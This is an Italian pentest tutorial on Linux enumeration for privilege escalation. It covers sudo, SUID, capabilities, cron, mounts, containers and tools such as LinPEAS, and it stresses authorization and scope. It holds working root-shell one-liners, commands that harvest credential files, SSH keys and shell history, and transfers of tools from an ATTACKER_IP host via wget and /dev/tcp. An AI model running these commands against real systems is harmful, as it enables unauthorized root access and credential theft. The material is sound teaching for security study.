---
title: 'Linux Enumeration: comandi e tool per la Privilege Escalation'
slug: linux-enumeration
description: 'Linux enumeration passo passo: usa comandi manuali, SUID, sudo, capabilities, cron, LinPEAS, LinEnum e LSE per individuare vettori di privilege escalation.'
image: /linux-enumeration-crime-scene.webp
draft: true
date: 2026-08-17T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - Linux Enumeration
  - Linux Privilege Escalation
  - LinPEAS
  - Linux Capabilities
  - Cron
---

# Linux Enumeration: Guida Completa per Pentest e Privilege Escalation

Hai una shell su un sistema Linux. Sei `www-data`, o un utente con pochi privilegi. L'obiettivo è diventare `root`. Per arrivarci devi prima capire dove sei, cosa gira sul sistema, e dove il sysadmin ha commesso un errore di configurazione.

Questo processo si chiama **enumerazione**: raccogliere informazioni sul sistema in modo sistematico, prima di provare qualsiasi exploit. Non esiste un singolo comando che funziona sempre — il path verso root cambia su ogni macchina, e l'unico modo per trovarlo è guardare con metodo.

Questa guida si concentra sulla parte di **enumerazione**: i comandi giusti, cosa significa ogni output, come distinguere un finding vero da uno che sembra interessante ma non lo è. Per l'exploitation completa di ogni vettore (con tutte le varianti e i prerequisiti) trovi la guida dedicata: [linux-privesc](https://hackita.it/articoli/linux-privesc). Qui trovi solo cosa serve per riconoscere il vettore e validarlo prima di passare all'exploitation vera e propria.

Per ogni controllo useremo lo stesso schema: **cosa controllare → comando → condizione vulnerabile → approfondimento**.

***

## Perché Enumerare Prima di Exploitare

L'errore più comune di chi inizia: scaricare subito LinPEAS, guardare l'output senza capirlo, e provare exploit a caso. Funziona raramente, e quando funziona spesso è perché il finding era comunque ovvio.

L'approccio più solido:

1. Enumeri manualmente i vettori principali — pochi minuti, ti dà già un'idea di dove guardare
2. Lanci un tool automatico per non perderti nulla
3. Interpreti l'output automatico sapendo già cosa stai cercando, invece di leggerlo come una lista casuale

Capire cosa cercare manualmente è quello che ti permette di leggere l'output di LinPEAS in modo critico — e distinguere un vero vettore da un falso positivo. È anche quello che ti chiedono di dimostrare in certificazioni come l'OSCP: non l'output del tool, ma perché quel finding è sfruttabile.

***

## I Primi Minuti: Contestualizzazione Rapida

Appena ottieni la shell, questi comandi ti danno il quadro generale.

```bash
# Chi sono?
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# uid=1001(mario) gid=1001(mario) groups=1001(mario),4(adm),27(sudo)
# Gruppo "sudo" → prova subito sudo -l
# Gruppo "adm" → hai accesso ai log di sistema → possono contenere credenziali
# Gruppo "docker" → indizio forte, non garanzia: dipende se il socket del
#                    daemon Docker rootful è raggiungibile e se puoi creare
#                    container/mount — vedi la sezione Container più sotto

# Dove sono e che sistema è?
hostname && uname -a && cat /etc/os-release
# uname -a mostra la versione del kernel: usala come punto di partenza per
# cercare CVE, ma verifica sempre la build/patch esatta della distribuzione —
# molte distro fanno backport delle fix senza cambiare il numero di versione visibile

# Cosa posso fare con sudo?
sudo -l
# (ALL) NOPASSWD: ALL → root diretto
# (ALL) NOPASSWD: /usr/bin/BINARIO → guarda GTFOBins per quel binario
# (root) NOPASSWD: /opt/script.sh → leggi lo script, cerca un punto debole
```

***

## Sistema Operativo e Kernel

**Cosa controllare:** versione kernel e distribuzione, per capire se esiste un kernel exploit noto.
**Comando:**

```bash
uname -r                    # versione kernel
uname -m                    # architettura: x86_64 (64-bit) o i686 (32-bit)
cat /etc/os-release
cat /etc/issue
```

**Condizione vulnerabile:** una CVE nota per quella build esatta del kernel — non basta il numero di versione principale, perché molte distribuzioni applicano patch di sicurezza senza cambiarlo (backport). Verifica sempre changelog e advisory della distribuzione specifica prima di assumere che sia sfruttabile.

```bash
# Cerca exploit potenziali (dal tuo attacker machine, non sul target)
searchsploit linux kernel 5.4
searchsploit "ubuntu 20.04 privilege escalation"
```

**Approfondimento:** un kernel exploit va trattato come **ultima risorsa**, non come primo tentativo — può causare crash o instabilità del sistema, quindi va usato solo dopo aver escluso vettori più sicuri (sudo, SUID, cron, capabilities) e, in un pentest reale, solo con autorizzazione esplicita nelle Rules of Engagement.

***

## Utenti e Gruppi

```bash
# Tutti gli utenti del sistema
cat /etc/passwd
# Cerca: utenti con UID 0 oltre a root (possibile backdoor), utenti con shell reale
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1,3,6,7

# Chi è loggato adesso?
w
who
last | head -20
# Se vedi sessioni di utenti privilegiati: documenta la cosa nel report.
# Accedere ai loro dati o file personali va fatto solo se esplicitamente
# previsto dallo scope del test — non per iniziativa propria.

# Gruppi interessanti
id
cat /etc/group | grep -E "sudo|admin|docker|lxd|disk|shadow|adm|wheel"
# sudo/wheel → verifica con sudo -l
# docker → vedi sezione Container Detection per le condizioni reali
# disk → potenziale accesso diretto ai dischi (quindi anche a /etc/shadow)
# adm → log di sistema leggibili → possibili credenziali in chiaro
# shadow → lettura diretta di /etc/shadow → hash delle password
```

***

## Sudo: Il Vettore Più Comune

**Cosa controllare:** cosa puoi eseguire con sudo, e se lo strumento concesso ti dà davvero un modo per uscire verso una shell.

```bash
sudo -l
```

**Condizione vulnerabile — regola permissiva:**

```bash
# (ALL) NOPASSWD: ALL → root immediato
sudo su
sudo bash

# (ALL) NOPASSWD: /usr/bin/BINARIO → cerca il binario su GTFOBins
# https://gtfobins.github.io → sezione "sudo"
sudo find /etc -exec /bin/bash \;
sudo vim -c ':!bash'
sudo python3 -c 'import os; os.system("bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
```

Nota su `cp`: se sudo ti concede solo `cp`, non hai automaticamente una via per diventare root. `cp` come sudo ti dà una primitiva di **lettura/scrittura privilegiata** — puoi copiare file che normalmente non potresti leggere, o sovrascrivere file che normalmente non potresti modificare (es. `/etc/passwd`, chiavi SSH autorizzate). L'escalation dipende da *quale* file riesci a leggere o scrivere con quel privilegio, non dal comando in sé. Copiare `/bin/bash` da qualche parte non lo rende automaticamente eseguibile come root: serve un passaggio in più (vedi [GTFOBins per cp](https://gtfobins.org/gtfobins/cp/) per le condizioni esatte, incluse opzioni come `--preserve=all`).

**Condizione vulnerabile — path relativo nello script:**

```bash
cat /opt/backup.sh
# Se lo script chiama un comando senza percorso assoluto (es. "tar" invece di "/bin/tar")
# e la directory che lo precede nel PATH *effettivo di root* è scrivibile da te,
# puoi sostituirlo. Attenzione: esportare PATH nella TUA shell non basta —
# conta il PATH con cui gira sudo, che spesso è forzato da secure_path in
# /etc/sudoers, oppure il PATH definito nello script stesso. Verifica prima
# quale PATH userà davvero il comando (grep secure_path /etc/sudoers, e
# controlla se lo script imposta un PATH proprio).
```

**Condizione vulnerabile — versione sudo nota:**

```bash
sudo --version
# CVE-2019-14287 non basta a scattare da sola: serve una regola sudoers con
# Runas basato su ALL (tipicamente con root esplicitamente escluso, es.
# "(ALL, !root) NOPASSWD: ALL"), e sudo < 1.8.28 — ma alcune distro (RHEL,
# per esempio) fanno backport della fix su versioni numericamente precedenti
# alla 1.8.28. Verifica sempre l'advisory della distribuzione, non solo il
# numero di versione.
sudo -u#-1 /bin/bash  # test, solo se la regola Runas lo permette
```

**Approfondimento:** [gtfobins](https://hackita.it/articoli/gtfobins) per l'elenco completo dei binari sfruttabili via sudo/SUID; exploitation dettagliata su [linux-privesc](https://hackita.it/articoli/linux-privesc).

***

## SUID e SGID: Binari che Girano con Privilegi del Proprietario

I file SUID (Set User ID) girano con i privilegi del proprietario del file, non di chi li lancia — se il proprietario è root, girano come root anche quando li esegui tu.

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID (stesso principio, sul gruppo)
```

**Attenzione:** binari come `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/su` sono **attesi** su molte distribuzioni — non "non sfruttabili" per definizione. Vanno comunque verificati: proprietario corretto? versione del pacchetto aggiornata? nessuna modifica sospetta rispetto al pacchetto originale? Allo stesso modo, non filtrare a priori tutti i binari sotto `/usr/bin` o `/bin`: un SUID custom malizioso può benissimo trovarsi lì, non solo in path "strani".

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

**Condizione vulnerabile:** un binario SUID (standard o custom) che compare nella lista di [GTFOBins](https://gtfobins.github.io) sotto la sezione SUID, e il cui proprietario è effettivamente root.

**Approfondimento:** [suid](https://hackita.it/articoli/suid) per la guida dedicata.

***

## Linux Capabilities

Le capabilities sono un meccanismo più granulare del SUID: invece di dare a un binario tutti i privilegi di root, gli danno solo un sottoinsieme specifico di poteri. Alcune di queste, se presenti, aprono comunque una via diretta all'escalation.

```bash
# Capabilities sui file (binari)
getcap -r / 2>/dev/null

# Capabilities del processo corrente — utile perché un binario può ricevere
# capability anche senza che siano scritte come extended attribute sul file
# (es. ereditate dal processo padre)
capsh --print
getpcaps $$
```

**Condizione vulnerabile — capability che permettono escalation diretta:**

```bash
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/ruby = cap_setuid+ep

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

Altre capability da cercare, il cui impatto reale dipende dal binario specifico che le possiede, dalle interfacce di rete disponibili e dal namespace in cui gira il processo — non sono automaticamente "root":

```
cap_sys_admin         → molto ampia, spesso quasi equivalente a root (mount, namespace)
cap_dac_override      → bypassa i controlli di permesso sui file
cap_dac_read_search    → bypassa i controlli di lettura su file e directory
cap_net_raw           → apre raw/packet socket — utile solo se il binario che
                          la possiede la usa per qualcosa di sfruttabile
cap_setgid            → analoga a cap_setuid ma sul group ID
cap_sys_ptrace        → permette di ispezionare/agganciare altri processi
cap_sys_module        → può caricare moduli del kernel → escalation quasi certa
cap_chown             → permette di cambiare proprietario di qualsiasi file
```

**Approfondimento:** [getcap](https://hackita.it/articoli/getcap).

***

## Cron e Scheduler: Task Pianificati Vulnerabili

I cron job girano spesso come root. Se lo script che eseguono è scrivibile da te — o se puoi dirottare un comando che lo script richiama — hai potenzialmente RCE come root.

```bash
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
crontab -l
crontab -l -u root 2>/dev/null   # solo se hai già accesso a farlo
```

**Condizione vulnerabile — script scrivibile:** verifica i permessi reali, non solo a colpo d'occhio. `-rwxrwxr-x` (775) significa che *proprietario e gruppo* possono scrivere — non "tutti". Solo `-rwxrwxrwx` (777) è scrivibile da chiunque. Controlla sempre con un test diretto, e anche i permessi delle directory superiori (una directory scrivibile ti permette di sostituire il file anche se il file stesso non lo è):

```bash
ls -la /opt/backup.sh
test -w /opt/backup.sh && echo "scrivibile da me"
namei -l /opt/backup.sh   # mostra i permessi di ogni directory nel path
```

**Condizione vulnerabile — path relativo nello script cron:** vale la stessa logica vista per sudo, ma qui il PATH che conta è quello **definito nel cron stesso** (in `/etc/crontab` c'è spesso una riga `PATH=...`), non quello della tua shell interattiva — esportare `PATH` nel tuo terminale non cambia l'ambiente in cui gira il cron.

```bash
# Cerca la riga PATH= in /etc/crontab e verifica se una delle directory
# elencate, PRIMA di quella del binario reale, è scrivibile da te
grep "^PATH=" /etc/crontab
```

**Monitoraggio in tempo reale:** `pspy` mostra i processi lanciati sul sistema — inclusi cron job che non vedi guardando solo i file di configurazione (es. lanciati da systemd timer, o da script che si auto-generano). Non richiede root, ma si appoggia a `/proc` per leggere i processi: può perdere processi molto brevi, e serve il binario compilato per l'architettura giusta (x86, x86\_64, ARM).

```bash
curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy
```

**Approfondimento:** [crontab](https://hackita.it/articoli/crontab), [pspy](https://hackita.it/articoli/pspy).

***

## Systemd Timer e Altri Scheduler

I timer systemd sono un meccanismo diverso dal cron classico, con la propria superficie di attacco — spesso dimenticato durante l'enumerazione.

```bash
# Timer attivi e programmati
systemctl list-timers --all

# Per ogni timer sospetto, guarda la unit collegata:
systemctl cat nome-del-timer.timer
systemctl cat nome-del-timer.service
# Cerca ExecStart= → quale script/binario lancia, e se è scrivibile

# Unit file scrivibili (systemd esegue spesso come root)
find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null

# Anacron e at — altri scheduler spesso ignorati
cat /etc/anacrontab 2>/dev/null
atq 2>/dev/null
```

**Condizione vulnerabile:** una unit file, un override, o lo script richiamato da `ExecStart=` scrivibile da te, con il servizio/timer eseguito da root.

***

## ACL e Permessi delle Directory

I permessi Unix classici (`rwx`) non sono l'unico meccanismo di controllo: le ACL POSIX possono concedere permessi extra che `ls -la` da solo non mostra.

```bash
getfacl /path/al/file          # ACL specifiche sul file
getfacl -R /opt 2>/dev/null    # ricorsivo su una directory

# Sticky bit su directory condivise (es. /tmp) — impedisce che un utente
# cancelli/rinomini file di un altro utente anche se la directory è 777
ls -ld /tmp
```

**Condizione vulnerabile:** un file con permessi Unix classici non scrivibili ma un'ACL che concede scrittura al tuo utente o gruppo — oppure, al contrario, una directory padre scrivibile che ti permette di intervenire indipendentemente dai permessi del file stesso (vedi `namei -l` sopra).

***

## Mount e Filesystem

```bash
findmnt
mount
cat /etc/fstab

# Opzioni di mount rilevanti per la sicurezza:
# nosuid → i binari SUID su quel mount NON funzionano come SUID
# noexec → i file su quel mount non sono eseguibili direttamente
# nodev  → i device file su quel mount vengono ignorati
# La loro ASSENZA su un mount scrivibile (es. /tmp senza nosuid/noexec)
# è la condizione che rende quel mount utile per un SUID custom o un binario da eseguire

# NFS — condivisioni di rete montate
cat /etc/exports 2>/dev/null   # se hai accesso al server NFS
showmount -e TARGET_IP          # dal tuo attacker, verso il server NFS
# no_root_squash nell'export → un client root mantiene i privilegi di root
# sui file NFS → se riesci a montare quella share, puoi creare un SUID
# come root sul tuo attacker e vederlo eseguito come root sul target
```

***

## File, Credenziali e Configurazioni Sensibili

```bash
# File scrivibili nel filesystem (fuori da pseudo-filesystem come /proc, /sys)
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"
find /etc /bin /sbin /usr -writable 2>/dev/null

# Credenziali in chiaro in file di configurazione
grep -rn "password\|passwd\|secret\|api_key\|DB_PASS" /etc/ /var/www/ /opt/ /home/ 2>/dev/null | grep -v "^#"

# Config ad alto valore
cat /etc/mysql/mysql.conf.d/*.cnf 2>/dev/null | grep -i "password\|user"
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/config.php 2>/dev/null

# History dei comandi — spesso password digitate per errore o per abitudine
cat ~/.bash_history /home/*/.bash_history 2>/dev/null

# Chiavi SSH
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
ls -la ~/.ssh/authorized_keys 2>/dev/null

# Variabili d'ambiente e config di tool che spesso contengono credenziali
env
cat /proc/self/environ 2>/dev/null | tr '\0' '\n'
cat ~/.aws/credentials 2>/dev/null
cat ~/.kube/config 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
cat ~/.npmrc ~/.pypirc 2>/dev/null
echo $SSH_AUTH_SOCK   # agent SSH attivo? potresti usarlo senza conoscere la passphrase

# File EnvironmentFile richiamati da unit systemd — spesso contengono secret
grep -r "EnvironmentFile" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null
```

***

## Servizi e Processi in Esecuzione

Non fermarti alla versione del servizio: conta anche *come* gira, con quali privilegi, e cosa carica.

```bash
ps aux | grep "^root"
systemctl list-units --type=service --state=running

# Per ogni servizio interessante che gira come root:
# - percorso reale dell'eseguibile (non solo il nome)
which nome-servizio 2>/dev/null
ls -la /proc/PID/exe 2>/dev/null
# - file di configurazione e unit file
systemctl cat nome-servizio
# - working directory del processo
ls -la /proc/PID/cwd 2>/dev/null
# - plugin o script caricati dinamicamente dal servizio (dipende dal servizio)

# Porte in ascolto — servizi non esposti esternamente, spesso mal protetti
# perché "tanto non è raggiungibile da fuori"
ss -tlnp
netstat -tlnp 2>/dev/null
```

**Condizione vulnerabile:** un servizio che gira come root, con una versione, configurazione o script caricato realmente vulnerabile — non basta "gira come root e ha un CVE nel nome": verifica versione esatta del pacchetto, patch della distribuzione, che la configurazione esponga davvero il difetto, e che tu possa raggiungerlo.

Se trovi un servizio raggiunto solo su `127.0.0.1`, puoi comunque testarlo facendo port forwarding verso la tua macchina:

```bash
ssh -L 8080:127.0.0.1:8080 user@TARGET
```

Per muoverti oltre la singola macchina (altre subnet viste con `ip route`): [pivoting](https://hackita.it/articoli/pivoting).

***

## Container Detection

Prima di dare per scontato di essere su un host "normale", verifica se sei dentro un container — cambia completamente cosa è raggiungibile e cosa "root" significa davvero.

```bash
# Indizi diretti
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup 2>/dev/null | head
cat /proc/self/cgroup 2>/dev/null

# Namespace: se il PID 1 non è init/systemd ma un processo applicativo,
# è un forte indizio di container
ps -p 1 -o comm=

# Socket dei runtime container in /run — se accessibili dal tuo utente,
# spesso equivalgono a controllo completo del runtime
ls -la /run/docker.sock /run/containerd/containerd.sock /run/podman/podman.sock 2>/dev/null
```

**Sul gruppo `docker`:** appartenere al gruppo non è automaticamente "container escape immediato". Serve che il socket di un **daemon Docker rootful** sia raggiungibile, che il daemon sia attivo, e che tu possa creare container o mount arbitrari (es. montare `/` dell'host dentro un nuovo container e uscirne come root host). Con **Docker rootless** il modello cambia e l'equivalenza "gruppo docker = root host" non vale più allo stesso modo — verifica quale modalità è in uso prima di assumerlo.

***

## Unix Socket Applicativi

Oltre ai socket dei runtime container, cerca socket Unix di database o applicazioni accessibili al tuo utente o gruppo — spesso senza autenticazione, perché "tanto è locale".

```bash
find / -type s 2>/dev/null | grep -v "^/proc\|^/run/docker\|^/run/containerd\|^/run/podman"
ls -la /var/run/ /run/ 2>/dev/null | grep "\.sock"
```

**Condizione vulnerabile:** un socket applicativo (MySQL, Redis, un'app interna) scrivibile dal tuo utente, che espone funzionalità privilegiate senza richiedere autenticazione separata.

***

## Controlli di Sicurezza Attivi

Prima di investire tempo in un vettore, verifica se qualche meccanismo di hardening lo blocca comunque — ti evita di inseguire un exploit che il sistema impedisce a monte.

```bash
# SELinux / AppArmor
getenforce 2>/dev/null              # SELinux: Enforcing / Permissive / Disabled
aa-status 2>/dev/null               # AppArmor

# seccomp e restrizioni sul processo
grep Seccomp /proc/self/status 2>/dev/null

# NoNewPrivileges sulle unit systemd — impedisce a un processo di ottenere
# nuovi privilegi anche se lancia un binario SUID
grep -r "NoNewPrivileges" /etc/systemd/system/ 2>/dev/null

# User namespace attivi
cat /proc/self/uid_map 2>/dev/null
```

***

## Rete e Connettività

```bash
ip addr show
ip route
# Subnet aggiuntive viste in "ip route" → possibile pivoting, vedi sopra

arp -n
ss -antp
cat /etc/hosts
cat /etc/resolv.conf
```

***

## Tool Automatici: Confronto

Dopo l'enumerazione manuale rapida, un tool automatico ti evita di perdere dettagli. Ogni tool ha un articolo dedicato con l'uso completo — qui solo il confronto per scegliere quale lanciare.

| Tool                                           | Punto di forza                                      | Quando usarlo                                                    |
| ---------------------------------------------- | --------------------------------------------------- | ---------------------------------------------------------------- |
| [LinPEAS](https://hackita.it/articoli/linpeas) | Copertura più ampia, output a colori per priorità   | Prima passata, quando vuoi il quadro più completo possibile      |
| [LinEnum](https://hackita.it/articoli/linenum) | Dati grezzi, nessun automatismo di interpretazione  | Quando vuoi controllare tu stesso ogni voce, senza filtri        |
| [LSE](https://hackita.it/articoli/lse)         | Output organizzato a livelli di verbosità crescente | Ambienti dove vuoi partire dal minimo indispensabile (livello 0) |

I finding segnalati come "alta priorità" (in rosso/giallo in LinPEAS) sono presentati dal progetto come findings ad alta confidenza — non un dato statistico misurato sul tuo target specifico. Vanno comunque validati manualmente: esistono falsi positivi.

***

## Trasferire File sul Target

```bash
# HTTP — il metodo più comodo se il target ha accesso alla tua rete
python3 -m http.server 8000        # sul tuo attacker
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh

# Base64 — quando non hai connessione diretta, solo bash
base64 -w 0 linpeas.sh              # sul tuo attacker, copi l'output
echo "BASE64_QUI" | base64 -d > /tmp/linpeas.sh   # sul target

# /dev/tcp — bash puro, zero tool esterni
nc -lvnp 4444 < linpeas.sh                        # sul tuo attacker
cat < /dev/tcp/ATTACKER_IP/4444 > /tmp/linpeas.sh  # sul target
```

`/dev/shm` è spesso usato al posto di `/tmp` perché è un `tmpfs` (filesystem in RAM) — ma non è automaticamente "stealth": può essere montato `noexec` (in tal caso i binari lì dentro non partono), e in ogni caso non elimina le tracce in log di sistema, audit, telemetria EDR o traffico di rete generato durante l'esecuzione.

***

## Workflow Operativo

Questo è un ordine di riferimento, da adattare alla situazione reale — non una sequenza fissa valida su ogni macchina.

```
1. Contestualizzazione: id, sudo -l, uname -r
2. Enumerazione manuale mirata: sudo, SUID, capabilities, cron/timer,
   mount, container detection, credenziali/config sensibili, servizi
3. Tool automatico (LinPEAS o alternativa) per copertura aggiuntiva
4. Validazione dei finding: condizione vulnerabile confermata? raggiungibile?
   permessi verificati con test -w / namei -l, non solo a occhio?
5. Exploitation del vettore confermato — dettagli su linux-privesc
6. Verifica: id conferma uid=0? Documenta il path seguito.
```

***

## Detection, Impatto Operativo e Cleanup Autorizzata

L'enumerazione lascia tracce: comandi in `.bash_history`, processi visibili a `pspy`/EDR di terze parti, file trasferiti su disco o in `/dev/shm`, connessioni di rete in uscita durante i download. Non dare per scontato di essere invisibili solo perché lavori da un filesystem in RAM.

In un pentest reale, la cleanup deve limitarsi agli artefatti **creati dal tester** — i tool trasferiti, i file temporanei, gli script aggiunti — documentati nel report, e va condotta secondo quanto concordato nelle Rules of Engagement. Non è appropriato cancellare la bash history in blocco: rimuoverebbe anche la cronologia legittima preesistente dell'utente, che non ti appartiene e che potrebbe servire per audit successivi.

***

## Checklist

```
SISTEMA
☐ id → gruppi rilevanti identificati (sudo, docker, lxd, disk, adm, shadow)?
☐ uname -r + verifica build/patch specifica della distribuzione?

SUDO / SUID / CAPABILITIES
☐ sudo -l eseguito e ogni voce verificata su GTFOBins?
☐ SUID/SGID enumerati, proprietario e pacchetto verificati (anche quelli "attesi")?
☐ getcap -r / e capsh --print eseguiti?

CRON / SYSTEMD / MOUNT
☐ Permessi reali degli script cron verificati con test -w e namei -l?
☐ systemctl list-timers --all controllato?
☐ mount/findmnt controllati per nosuid/noexec/nodev mancanti?

CONTAINER / SOCKET / SICUREZZA
☐ /.dockerenv, cgroup, PID 1 controllati?
☐ Socket Docker/containerd/Podman verificati per raggiungibilità reale?
☐ SELinux/AppArmor/seccomp/NoNewPrivileges controllati?

CREDENZIALI
☐ .bash_history, .env, config.php, chiavi SSH cercati?
☐ .aws, .kube/config, .docker/config.json, agent SSH controllati?

VALIDAZIONE E TOOL
☐ Ogni finding manuale ricontrollato con condizione esplicita (non solo "sembra vulnerabile")?
☐ Tool automatico lanciato come seconda passata, non come primo passo?
```

***

## FAQ

**Qual è il primo comando che eseguo dopo aver ottenuto una shell?**
`id` e `sudo -l`, in quest'ordine. `id` ti dice subito se sei in gruppi potenzialmente utili. `sudo -l` ti dice se hai già un modo diretto verso root senza altri passaggi.

**LinPEAS trova tutto o devo fare anche l'enumerazione manuale?**
LinPEAS è ampio ma non infallibile — dipende dalla configurazione del sistema, a volte manca output, a volte genera troppo rumore da filtrare. L'enumerazione manuale ti serve per interpretare correttamente ciò che il tool trova, e per i casi in cui il tool stesso non gira bene (ambienti ristretti, container, filesystem non standard).

**Non trovo nulla con i tool automatici. Cosa faccio?**
Prova pspy per vedere processi in tempo reale che i controlli statici non mostrano. Approfondisci mount, ACL, socket applicativi e variabili d'ambiente — sono spesso trascurati. Un kernel exploit resta un'opzione, ma solo come ultima risorsa, dopo aver escluso vettori più sicuri, e solo con autorizzazione esplicita in un pentest reale.

**Devo pulire le tracce dopo l'enumerazione?**
In un pentest reale: rimuovi solo gli artefatti che hai creato tu (tool trasferiti, file temporanei), documentali nel report, e segui quanto previsto dalle Rules of Engagement. Non cancellare la bash history in blocco — cancelleresti anche cronologia legittima che non ti appartiene. In CTF/HTB la cleanup non è tipicamente richiesta.

***

## Risorse

* [PEASS-ng (LinPEAS)](https://github.com/carlospolop/PEASS-ng)
* [GTFOBins](https://gtfobins.github.io)
* [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

***

> Hai la shell. La domanda giusta non è "quale exploit provo", ma "cosa sto guardando, e perché è davvero sfruttabile". Metodologia, non fortuna.
